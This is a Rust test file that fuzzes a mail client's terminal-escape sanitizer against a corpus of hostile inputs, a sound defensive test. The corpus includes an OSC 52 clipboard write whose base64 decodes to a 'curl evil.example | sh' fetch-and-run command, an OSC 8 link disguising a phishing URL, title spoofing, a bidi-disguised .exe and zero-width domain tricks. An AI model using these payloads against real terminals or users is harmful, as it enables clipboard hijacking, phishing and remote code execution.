//! The terminal filter against hostile mail (ADR 0007, Phase 0 gate).
//!
//! Every entry of a corpus of escape-sequence attacks, and thousands of
//! deterministic mutations and random mixes of them, goes through
//! `terminal::sanitize` and `terminal::sanitize_line`, and an independent
//! checker reads each output: no character below U+0020 except `\n` (and
//! not even that from `sanitize_line`), no DEL, no C1 control, no ESC, no
//! bidirectional or zero-width character, and (for the corpus) none of
//! the payloads the attacks carry.

use rand::{Rng, SeedableRng, rngs::StdRng, seq::SliceRandom};
use zmail_security::terminal::{sanitize, sanitize_line};

/// One attack: a label, the hostile text, and what must be left of it.
struct Case {
    label: &'static str,
    input: &'static str,
    expected: &'static str,
}

const CORPUS: &[Case] = &[
    Case {
        label: "CSI cursor home and erase display",
        input: "Invoice\x1b[H\x1b[2JYour account is locked",
        expected: "InvoiceYour account is locked",
    },
    Case {
        label: "CSI cursor up and erase line, to overwrite the sender",
        input: "From: attacker\x1b[1A\x1b[2K\rFrom: bank@example.com",
        expected: "From: attacker\nFrom: bank@example.com",
    },
    Case {
        label: "CSI cursor position and colours",
        input: "\x1b[31;1;4mred\x1b[0m \x1b[38;2;255;0;0mtrue\x1b[m \x1b[10;20Hhere",
        expected: "red true here",
    },
    Case {
        label: "CSI private modes: alternate screen, hidden cursor, mouse",
        input: "a\x1b[?1049h\x1b[?25l\x1b[?1000hb",
        expected: "ab",
    },
    Case {
        label: "CSI device status report, which makes the terminal type",
        input: "a\x1b[6nb\x1b[cc",
        expected: "abc",
    },
    Case {
        label: "OSC 0 window title, BEL-terminated",
        input: "\x1b]0;sudo password:\x07Subject",
        expected: "Subject",
    },
    Case {
        label: "OSC 2 window title, ST-terminated",
        input: "\x1b]2;Terminal\x1b\\Subject",
        expected: "Subject",
    },
    Case {
        label: "OSC 52 clipboard write",
        input: "Paste this:\x1b]52;c;Y3VybCBldmlsLmV4YW1wbGUgfCBzaA==\x07 done",
        expected: "Paste this: done",
    },
    Case {
        label: "OSC 52 clipboard query",
        input: "x\x1b]52;c;?\x1b\\y",
        expected: "xy",
    },
    Case {
        label: "OSC 8 hyperlink with misleading text",
        input: "\x1b]8;;https://evil.example/login\x1b\\https://bank.example\x1b]8;;\x1b\\",
        expected: "https://bank.example",
    },
    Case {
        label: "OSC 4 palette change",
        input: "a\x1b]4;1;rgb:00/00/00\x07b",
        expected: "ab",
    },
    Case {
        label: "DCS sixel graphics",
        input: "a\x1bPq\"1;1;10;10#0;2;0;0;0#0!10~\x1b\\b",
        expected: "ab",
    },
    Case {
        label: "DCS tmux passthrough smuggling an OSC",
        input: "a\x1bPtmux;\x1b\x1b]52;c;ZXZpbA==\x07\x1b\\b",
        expected: "ab",
    },
    Case {
        label: "DCS request status string",
        input: "a\x1bP$qm\x1b\\b",
        expected: "ab",
    },
    Case {
        label: "APC kitty graphics",
        input: "a\x1b_Ga=T,f=100;iVBORw0KGgo=\x1b\\b",
        expected: "ab",
    },
    Case {
        label: "PM and SOS strings",
        input: "a\x1b^private\x1b\\b\x1bXstring\x1b\\c",
        expected: "abc",
    },
    Case {
        label: "8-bit CSI",
        input: "a\u{9b}2J\u{9b}31mb",
        expected: "ab",
    },
    Case {
        label: "8-bit OSC with 8-bit ST",
        input: "a\u{9d}0;title\u{9c}b",
        expected: "ab",
    },
    Case {
        label: "8-bit OSC 52 with BEL",
        input: "a\u{9d}52;c;ZXZpbA==\x07b",
        expected: "ab",
    },
    Case {
        label: "8-bit DCS, SOS, PM and APC",
        input: "a\u{90}q\u{9c}b\u{98}s\u{9c}c\u{9e}p\u{9c}d\u{9f}G\u{9c}e",
        expected: "abcde",
    },
    Case {
        label: "Other C1 controls (NEL, IND, RI)",
        input: "a\u{85}b\u{84}c\u{8d}d",
        expected: "abcd",
    },
    Case {
        label: "Short escapes: reset, save and restore cursor, charset",
        input: "a\x1bcb\x1b7c\x1b8d\x1b(0e\x1b)Bf\x1b#8g\x1bMh",
        expected: "abcdefgh",
    },
    Case {
        label: "Bidi override to disguise a file name",
        input: "invoice\u{202E}fdp.exe",
        expected: "invoicefdp.exe",
    },
    Case {
        label: "Bidi isolates and marks",
        input: "\u{2067}a\u{2069}\u{200F}b\u{200E}\u{202B}c\u{202C}",
        expected: "abc",
    },
    Case {
        label: "Zero-width characters inside a domain",
        input: "pay\u{200B}pal\u{2060}.com\u{FEFF}",
        expected: "paypal.com",
    },
    Case {
        label: "Backspace overstrike",
        input: "safe\x08\x08\x08\x08evil",
        expected: "safeevil",
    },
    Case {
        label: "Bell, vertical tab, form feed, NUL and DEL",
        input: "a\x07b\x0bc\x0cd\x00e\x7ff",
        expected: "abcdef",
    },
    Case {
        label: "Unterminated OSC swallows the rest",
        input: "visible\x1b]0;title with no end\nmore text",
        expected: "visible",
    },
    Case {
        label: "Unterminated DCS swallows the rest",
        input: "visible\x1bP1$r",
        expected: "visible",
    },
    Case {
        label: "Unterminated CSI at the end",
        input: "visible\x1b[1;2",
        expected: "visible",
    },
    Case {
        label: "Lone ESC at the end",
        input: "visible\x1b",
        expected: "visible",
    },
    Case {
        label: "ESC inside a string restarts an escape",
        input: "\x1b]0;x\x1b[2Jvisible",
        expected: "visible",
    },
    Case {
        label: "Doubled ESC",
        input: "a\x1b\x1b[31mb",
        expected: "ab",
    },
    Case {
        label: "Tabs and CRLF",
        input: "col1\tcol2\r\nrow2",
        expected: "col1    col2\nrow2",
    },
];

/// Bidirectional and zero-width characters, listed independently of the
/// filter's own list.
const INVISIBLE: &[char] = &[
    '\u{200B}', '\u{200C}', '\u{200D}', '\u{200E}', '\u{200F}', '\u{202A}', '\u{202B}', '\u{202C}',
    '\u{202D}', '\u{202E}', '\u{2060}', '\u{2061}', '\u{2062}', '\u{2063}', '\u{2064}', '\u{2066}',
    '\u{2067}', '\u{2068}', '\u{2069}', '\u{FEFF}',
];

/// Payloads the corpus's attacks carry, which must never show as text.
const PAYLOADS: &[&str] = &[
    "52;c",
    "Y3VybC",
    "ZXZpbA",
    "]8;;",
    "evil.example",
    "sudo password",
    "rgb:00",
    "iVBORw0",
    "?1049",
    "tmux;",
];

/// Everything wrong with a filtered string.
fn problems(output: &str, one_line: bool) -> Vec<String> {
    let mut problems = Vec::new();
    for (index, ch) in output.char_indices() {
        let code = ch as u32;
        let bad = match ch {
            '\n' if one_line => Some("a newline in a one-line field"),
            '\n' => None,
            _ if code < 0x20 => Some("a C0 control"),
            '\u{7F}' => Some("DEL"),
            '\u{80}'..='\u{9F}' => Some("a C1 control"),
            _ if INVISIBLE.contains(&ch) => Some("an invisible format character"),
            _ => None,
        };
        if let Some(bad) = bad {
            problems.push(format!("{bad} (U+{code:04X}) at byte {index}"));
        }
    }
    problems
}

fn assert_safe(label: &str, input: &str) -> String {
    let output = sanitize(input);
    let found = problems(&output, false);
    assert!(
        found.is_empty(),
        "{label}: {found:?}\ninput: {input:?}\noutput: {output:?}"
    );
    let line = sanitize_line(input);
    let found = problems(&line, true);
    assert!(
        found.is_empty(),
        "{label} (one line): {found:?}\ninput: {input:?}\noutput: {line:?}"
    );
    // The filter's output is already safe, so filtering again changes
    // nothing.
    assert_eq!(sanitize(&output), output, "{label}: not idempotent");
    output
}

#[test]
fn hostile_corpus_comes_out_safe_and_readable() {
    for case in CORPUS {
        let output = assert_safe(case.label, case.input);
        assert_eq!(output, case.expected, "{}", case.label);
        for payload in PAYLOADS {
            assert!(
                !output.contains(payload),
                "{}: the payload {payload:?} survived",
                case.label
            );
        }
    }
}

#[test]
fn every_byte_value_on_its_own_and_after_escape_is_filtered() {
    for code in 0..=0x2FF_u32 {
        let Some(ch) = char::from_u32(code) else {
            continue;
        };
        assert_safe(&format!("U+{code:04X}"), &format!("a{ch}b"));
        assert_safe(&format!("ESC U+{code:04X}"), &format!("a\x1b{ch}b"));
        assert_safe(&format!("CSI U+{code:04X}"), &format!("a\x1b[1{ch}b"));
        assert_safe(&format!("OSC U+{code:04X}"), &format!("a\x1b]0;{ch}\x07b"));
    }
}

/// Pieces the mutations splice in: introducers, terminators and controls.
const PIECES: &[&str] = &[
    "\x1b",
    "\x1b[",
    "\x1b]",
    "\x1bP",
    "\x1b_",
    "\x1b^",
    "\x1bX",
    "\x1b\\",
    "\x07",
    "\u{9b}",
    "\u{9c}",
    "\u{9d}",
    "\u{90}",
    "\u{9f}",
    "\x1b]52;c;ZXZpbA==\x07",
    "\x1b]8;;https://evil.example/\x1b\\",
    "\x1b[2J",
    "\x1b[?1049h",
    "\r",
    "\n",
    "\t",
    "\x00",
    "\x7f",
    "\u{202E}",
    "\u{200B}",
    "\u{2028}",
    ";",
    "?",
    "m",
    "H",
    "é",
    "日本",
    "📬",
];

#[test]
fn mutated_hostile_text_comes_out_safe() {
    let corpus: Vec<&str> = CORPUS.iter().map(|case| case.input).collect();
    // CI runs a fixed seed; a longer local run can pick its own:
    // ZMAIL_FUZZ_SEED=7 ZMAIL_FUZZ_ITERATIONS=1000000 cargo test --release …
    let seed = std::env::var("ZMAIL_FUZZ_SEED")
        .ok()
        .and_then(|seed| seed.parse().ok())
        .unwrap_or(0x0007_0000_7a6d_6169);
    let iterations = std::env::var("ZMAIL_FUZZ_ITERATIONS")
        .ok()
        .and_then(|iterations| iterations.parse().ok())
        .unwrap_or(if cfg!(debug_assertions) {
            5_000
        } else {
            50_000
        });
    let mut rng = StdRng::seed_from_u64(seed);
    for iteration in 0..iterations {
        let mut mutated = (*corpus.choose(&mut rng).expect("a corpus entry")).to_owned();
        for _ in 0..rng.gen_range(1..=8) {
            mutate(&mut mutated, &corpus, &mut rng);
        }
        assert_safe(&format!("mutation {iteration} of seed {seed}"), &mutated);
    }
}

#[test]
fn random_text_comes_out_safe() {
    let mut rng = StdRng::seed_from_u64(0x0007_0000_7261_6e64);
    for iteration in 0..2_000 {
        let length = rng.gen_range(0..64);
        let text: String = (0..length)
            .map(|_| match rng.gen_range(0..4) {
                // Mostly the ranges that matter: ASCII with its controls,
                // and C1 with Latin-1.
                0 | 1 => char::from(rng.gen_range(0..0x80_u8)),
                2 => char::from_u32(rng.gen_range(0x80..0x100)).expect("Latin-1"),
                _ => rng.r#gen::<char>(),
            })
            .collect();
        let output = sanitize(&text);
        let found = problems(&output, false);
        assert!(
            found.is_empty(),
            "random {iteration}: {found:?}\ninput: {text:?}"
        );
        let line = sanitize_line(&text);
        let found = problems(&line, true);
        assert!(
            found.is_empty(),
            "random {iteration} (one line): {found:?}\ninput: {text:?}"
        );
    }
}

fn mutate(input: &mut String, corpus: &[&str], rng: &mut StdRng) {
    let boundary = |input: &str, rng: &mut StdRng| {
        let at = rng.gen_range(0..=input.len());
        input.floor_char_boundary(at)
    };
    match rng.gen_range(0..4) {
        0 | 1 => {
            let at = boundary(input, rng);
            let piece = PIECES.choose(rng).expect("a piece");
            input.insert_str(at, piece);
        }
        2 => {
            let start = boundary(input, rng);
            let end =
                input.floor_char_boundary(start + input[start..].len().min(rng.gen_range(0..16)));
            input.replace_range(start..end, "");
        }
        _ => {
            let other = corpus.choose(rng).expect("a corpus entry");
            let from = boundary(other, rng);
            let to =
                other.floor_char_boundary(from + other[from..].len().min(rng.gen_range(0..32)));
            let at = boundary(input, rng);
            input.insert_str(at, &other[from..to]);
        }
    }
}
